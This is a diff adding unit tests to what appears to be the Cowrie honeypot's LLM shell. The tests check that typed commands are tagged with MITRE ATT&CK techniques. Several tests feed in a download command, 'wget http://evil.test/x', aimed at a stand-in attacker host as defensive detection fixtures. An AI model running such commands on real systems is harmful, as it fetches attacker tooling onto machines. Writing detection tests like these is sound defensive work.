@@ -252,6 +252,59 @@ class TestCommandCap(unittest.TestCase):
         self.assertNotIn(b"cannot fork", self.tr.value())
 
 
+class TestAttackMapping(unittest.TestCase):
+    """The protocol tags commands with MITRE ATT&CK techniques."""
+
+    def setUp(self) -> None:
+        self.proto, self.tr, self.stub = _make_protocol()
+        # Disable the real download interceptor — we only care that the
+        # ATT&CK event (emitted before the interceptor) fires; a live treq
+        # fetch would dirty the reactor.
+        from cowrie.core.config import CowrieConfig
+        if not CowrieConfig.has_section("llm"):
+            CowrieConfig.add_section("llm")
+        CowrieConfig.set("llm", "capture_downloads", "false")
+        self.addCleanup(
+            lambda: CowrieConfig.remove_option("llm", "capture_downloads")
+        )
+        # Capture log.msg calls by patching the protocol module's log ref —
+        # narrower and less fragile than a global twisted log observer.
+        from cowrie.llm import protocol as protomod
+        self._events: list[dict] = []
+        self.patch(protomod.log, "msg", lambda *a, **k: self._events.append(k))
+
+    def tearDown(self) -> None:
+        try:
+            self.proto.setTimeout(None)
+        except Exception:
+            pass
+
+    def _attack_events(self):
+        return [e for e in self._events
+                if e.get("eventid") == "cowrie.llm.attack"]
+
+    def test_download_command_emits_attack_event(self):
+        self.proto.lineReceived(b"wget http://evil.test/x -O /tmp/x")
+        evs = self._attack_events()
+        self.assertTrue(evs)
+        self.assertIn("T1105", evs[-1]["techniques"])
+
+    def test_navigation_emits_no_attack_event(self):
+        self.proto.lineReceived(b"cd /tmp")
+        self.assertEqual(self._attack_events(), [])
+
+    def test_disabling_mapping_suppresses_event(self):
+        from cowrie.core.config import CowrieConfig
+        if not CowrieConfig.has_section("llm"):
+            CowrieConfig.add_section("llm")
+        CowrieConfig.set("llm", "attack_mapping", "false")
+        self.addCleanup(
+            lambda: CowrieConfig.remove_option("llm", "attack_mapping")
+        )
+        self.proto.lineReceived(b"wget http://evil.test/x")
+        self.assertEqual(self._attack_events(), [])
+
+
 # ----------------------------------------------------------------------
 # Persona + WorldState init
 
